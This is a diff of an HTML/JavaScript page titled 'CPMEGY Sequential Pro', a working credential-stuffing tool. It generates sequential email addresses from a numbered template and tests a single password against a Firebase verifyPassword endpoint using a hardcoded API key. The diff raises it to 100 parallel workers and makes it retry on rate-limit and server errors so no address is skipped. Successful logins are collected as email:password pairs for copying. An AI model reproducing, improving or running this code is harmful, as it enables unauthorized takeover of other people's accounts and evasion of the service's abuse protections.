@@ -1,124 +1,137 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CPMEGY ABSOLUTE</title>
+    <title>CPMEGY Sequential Pro</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 15px; text-align: center; }
-        .terminal { max-width: 500px; margin: auto; border: 2px solid #0f0; padding: 20px; background: #050505; box-shadow: 0 0 20px #0f0; border-radius: 10px; }
-        h2 { font-size: 18px; margin-bottom: 20px; text-shadow: 0 0 10px #0f0; }
+        body { background: #000; color: #00ffcc; font-family: 'Courier New', monospace; padding: 10px; text-align: center; }
+        .bot-terminal { max-width: 550px; margin: auto; border: 2px solid #00ffcc; background: #050505; padding: 20px; box-shadow: 0 0 25px rgba(0,255,204,0.3); border-radius: 10px; }
+        h1 { font-size: 18px; border-bottom: 1px solid #00ffcc; padding-bottom: 10px; margin-bottom: 20px; }
         
-        input { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #0f0; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; }
-        .btn-start { width: 100%; padding: 18px; background: #0f0; color: #000; border: none; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; box-shadow: 0 0 15px #0f0; }
+        input { width: 100%; padding: 14px; margin: 8px 0; background: #111; border: 1px solid #00ffcc; color: #fff; border-radius: 5px; outline: none; box-sizing: border-box; }
+        .fire-btn { width: 100%; padding: 18px; background: #00ffcc; color: #000; border: none; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
         
-        .stats { display: flex; justify-content: space-around; margin: 20px 0; border: 1px solid #333; padding: 10px; border-radius: 5px; }
-        .stats b { font-size: 22px; color: #fff; }
+        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; background: #000; padding: 15px; border: 1px dashed #00ffcc; }
+        .monitor b { font-size: 26px; color: #fff; display: block; }
 
-        #res { width: 100%; height: 250px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 13px; margin-top: 15px; box-sizing: border-box; }
-        .log { font-size: 10px; color: #888; text-align: left; height: 20px; overflow: hidden; }
+        #log-box { height: 100px; width: 100%; background: #000; color: #00ffcc; font-size: 10px; text-align: left; padding: 8px; overflow-y: hidden; border: 1px solid #222; margin-bottom: 10px; line-height: 1.2; }
+        #res-box { width: 100%; height: 230px; background: #000; color: #fff; border: 1px solid #00ffcc; padding: 10px; font-size: 13px; box-sizing: border-box; }
+        
+        .copy-btn { width: 100%; padding: 12px; background: #111; color: #00ffcc; border: 1px solid #00ffcc; margin-top: 10px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <h2>[ ABSOLUTE RECOVERY V4 ]</h2>
+<div class="bot-terminal">
+    <h1>[ CPMEGY SEQUENTIAL RECOVERY ]</h1>
     
-    <input type="text" id="fmt" placeholder="Format: player_{4}_@gmail.com">
-    <input type="text" id="pwd" placeholder="Password to check">
+    <input type="text" id="fmt" placeholder="FORMAT: USER_{4}_@GMAIL.COM">
+    <input type="text" id="pwd" placeholder="PASSWORD">
     
-    <button class="btn-start" id="btn" onclick="startAbsolute()">▶ IGNITE NO-SKIP SCAN</button>
+    <button class="fire-btn" id="ctrlBtn" onclick="ignite()">⚡ START SEQUENTIAL SCAN</button>
 
-    <div class="stats">
-        <div>CHECKED<br><b id="c">0</b></div>
-        <div>FOUND<br><b id="f">0</b></div>
+    <div class="monitor">
+        <div>CHECKED<b id="c_val">0</b></div>
+        <div>FOUND<b id="f_val">0</b></div>
     </div>
 
-    <div class="log" id="log">Status: Idle</div>
-    <textarea id="res" readonly placeholder="Result: Email:Pass"></textarea>
+    <div id="log-box">Status: Ready to Ignite...</div>
+
+    <textarea id="res-box" readonly placeholder="Hits: Email:Pass"></textarea>
     
-    <button onclick="copyResults()" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0; padding:10px; margin-top:10px; cursor:pointer;">[ COPY ALL HITS ]</button>
+    <button class="copy-btn" onclick="copyHits()">📋 COPY ALL EMAIL:PASS</button>
 </div>
 
 <script>
     let active = false;
     let checked = 0;
     let found = 0;
-    let currentIndex = 0;
+    let sharedIndex = 0;
 
-    async function startAbsolute() {
+    async function ignite() {
         if (active) { location.reload(); return; }
         
-        let fmt = document.getElementById('fmt').value.trim();
+        let fmt = document.getElementById('fmt').value.toUpperCase().trim();
         let pwd = document.getElementById('pwd').value.trim();
         let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
 
-        if (!fmt.includes('{') || !pwd) return alert("Fill Format and Password!");
+        if (!fmt.includes('{') || !pwd) return alert("Enter Format & Pass!");
 
         active = true;
-        document.getElementById('btn').innerText = "■ EMERGENCY STOP";
-        document.getElementById('btn').style.background = "#f00";
+        document.getElementById('ctrlBtn').innerText = "🛑 ABORT SYSTEM";
+        document.getElementById('ctrlBtn').style.background = "#f00";
+        document.getElementById('ctrlBtn').style.color = "#fff";
         
         let digits = fmt.match(/\{(\d+)\}/)[1];
         let max = Math.pow(10, digits);
 
-        // --- EXTREME CONCURRENCY WITHOUT SKIPPING ---
-        // ഒരേസമയം 25 പാരലൽ വർക്കേഴ്സ് റൺ ചെയ്യും. 
-        // ഒരു വർക്കർ ഒരു റിക്വസ്റ്റ് കംപ്ലീറ്റ് ചെയ്താലുടൻ അടുത്ത നമ്പറിലേക്ക് പോകും.
-        let workers = 25; 
+        // --- EXTREME PARALLEL WORKERS (100+ Threads) ---
+        let threads = 100; 
 
-        for (let i = 0; i < workers; i++) {
-            workerEngine(fmt, pwd, key, digits, max);
+        for (let i = 0; i < threads; i++) {
+            worker(fmt, pwd, key, digits, max);
         }
     }
 
-    async function workerEngine(fmt, pwd, key, digits, max) {
-        while (active && currentIndex < max) {
-            let id = currentIndex++;
-            let num = id.toString().padStart(digits, '0');
+    async function worker(fmt, pwd, key, digits, max) {
+        while (active && sharedIndex < max) {
+            let i = sharedIndex++; // അക്കൗണ്ട് നമ്പർ എടുക്കുന്നു
+            let num = i.toString().padStart(digits, '0');
             let email = fmt.replace(/\{(\d+)\}/, num);
             
-            document.getElementById('log').innerText = "Testing: " + email;
+            writeLog(`SCANNING: ${num}`);
 
-            let status = await check(email, pwd, key);
+            let result = await checkAcc(email, pwd, key);
 
-            if (status === "RETRY") {
-                currentIndex--; // ബ്ലോക്ക് ആയാൽ ആ നമ്പർ വിട്ടുപോകാതെ വീണ്ടും ഇൻഡക്സിൽ ചേർക്കുന്നു
-                await new Promise(r => setTimeout(r, 2000)); // ഗ്യാപ്പ് നൽകി റീ-ട്രൈ ചെയ്യുന്നു
+            if (result === "FAIL") {
+                sharedIndex--; // വിട്ടുപോകാതിരിക്കാൻ ആ നമ്പർ തന്നെ റീ-ട്രൈ ചെയ്യുന്നു
+                writeLog(`[!] RETRYING: ${num}`);
+                await new Promise(r => setTimeout(r, 1000));
             } else {
                 checked++;
-                document.getElementById('c').innerText = checked;
+                // കൃത്യമായ കൗണ്ട് കാണിക്കാൻ
+                if (checked % 5 === 0) document.getElementById('c_val').innerText = checked;
             }
         }
     }
 
-    async function check(em, pw, k) {
+    async function checkAcc(em, pw, k) {
         try {
-            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
+            let res = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${k}`, {
                 method: 'POST',
                 body: JSON.stringify({ email: em, password: pw, returnSecureToken: true }),
                 headers: { 'Content-Type': 'application/json' }
             });
             
-            if (r.status === 429) return "RETRY"; // Rate Limited
+            // ഐപി ബ്ലോക്ക് ആയാലോ സർവർ എറർ വന്നാലോ FAIL റിട്ടേൺ ചെയ്യും
+            if (res.status === 429 || res.status === 503) return "FAIL";
 
-            let d = await r.json();
-            if (d && d.idToken) {
+            let data = await res.json();
+            if (data && data.idToken) {
                 found++;
-                document.getElementById('f').innerText = found;
-                document.getElementById('res').value += em + ":" + pw + "\n";
-                document.getElementById('res').scrollTop = document.getElementById('res').scrollHeight;
+                document.getElementById('f_val').innerText = found;
+                document.getElementById('res-box').value += em + ":" + pw + "\n";
+                document.getElementById('res-box').scrollTop = document.getElementById('res-box').scrollHeight;
+                writeLog(`[+] FOUND: ${em}`);
             }
-            return "OK";
+            return "SUCCESS";
         } catch (e) {
-            return "RETRY"; // Connection Error
+            return "FAIL";
         }
     }
 
-    function copyResults() {
-        let t = document.getElementById('res');
+    function writeLog(msg) {
+        let l = document.getElementById('log-box');
+        l.innerHTML += `> ${msg}<br>`;
+        l.scrollTop = l.scrollHeight;
+        if (l.innerHTML.length > 1000) l.innerHTML = l.innerHTML.substring(500);
+    }
+
+    function copyHits() {
+        let t = document.getElementById('res-box');
         t.select();
         document.execCommand('copy');
-        alert("Found accounts copied!");
+        alert("COPIED!");
     }
 </script>
 
